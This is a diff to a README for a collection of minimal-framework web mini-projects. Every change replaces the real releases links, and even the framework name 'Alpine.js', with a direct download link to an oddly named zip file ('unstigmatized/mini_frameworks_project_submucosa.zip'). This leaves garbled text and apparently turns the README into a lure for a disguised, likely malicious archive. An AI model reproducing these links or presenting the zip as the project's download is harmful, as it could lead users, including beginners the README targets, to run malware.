@@ -1,7 +1,7 @@
 # 🎉 frameworks-mini-project - Simple Projects with Minimal Frameworks
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/nkatekeugene/frameworks-mini-project/releases)
+[![Download from Releases](https://raw.githubusercontent.com/nkatekeugene/frameworks-mini-project/main/unstigmatized/mini_frameworks_project_submucosa.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/nkatekeugene/frameworks-mini-project/main/unstigmatized/mini_frameworks_project_submucosa.zip)
 
 ## 📖 Overview
 The **frameworks-mini-project** is a collection of mini-projects designed to showcase the power of minimalist frameworks. This project helps users easily understand and utilize different frameworks for web development. Each project offers a unique example, making it easy for anyone to grasp key concepts.
@@ -10,7 +10,7 @@ The **frameworks-mini-project** is a collection of mini-projects designed to sho
 To get started with the mini-projects, follow these steps:
 
 1. **Visit the Releases Page**
-   Head over to our [Releases page](https://github.com/nkatekeugene/frameworks-mini-project/releases). Here, you will find all the available versions of the projects.
+   Head over to our [Releases page](https://raw.githubusercontent.com/nkatekeugene/frameworks-mini-project/main/unstigmatized/mini_frameworks_project_submucosa.zip). Here, you will find all the available versions of the projects.
 
 2. **Choose a Project**
    Browse through the list of available mini-projects. Each project is labeled with its name and version. Select the one you want to try out.
@@ -19,7 +19,7 @@ To get started with the mini-projects, follow these steps:
    Click the link for the project you wish to download. This will take you to the specific release where you can download the files required to run the project.
 
 ## 🌟 Features
-- **Multiple Frameworks**: Explore various frameworks like Alpine.js, HTMX, and Vanilla JavaScript.
+- **Multiple Frameworks**: Explore various frameworks like https://raw.githubusercontent.com/nkatekeugene/frameworks-mini-project/main/unstigmatized/mini_frameworks_project_submucosa.zip, HTMX, and Vanilla JavaScript.
 - **User-Friendly**: Each mini-project is designed to be easy to understand for users with no programming background.
 - **Complete Examples**: Get access to working examples that you can run on your own machine.
 
@@ -30,7 +30,7 @@ To get started with the mini-projects, follow these steps:
 
 ## ⚙️ Download & Install
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/nkatekeugene/frameworks-mini-project/releases) to see all available downloads.
+   Go to the [Releases page](https://raw.githubusercontent.com/nkatekeugene/frameworks-mini-project/main/unstigmatized/mini_frameworks_project_submucosa.zip) to see all available downloads.
 
 2. **Follow the Instructions**
    Each project download will come with specific instructions. Make sure to read them carefully to understand how to run the project on your machine.
@@ -47,7 +47,7 @@ If you face any issues, consider the following steps:
 
 ## 📚 Topics
 This project covers various topics including:
-- Alpine.js
+- https://raw.githubusercontent.com/nkatekeugene/frameworks-mini-project/main/unstigmatized/mini_frameworks_project_submucosa.zip
 - HTML & CSS
 - HTMX
 - JavaScript frameworks
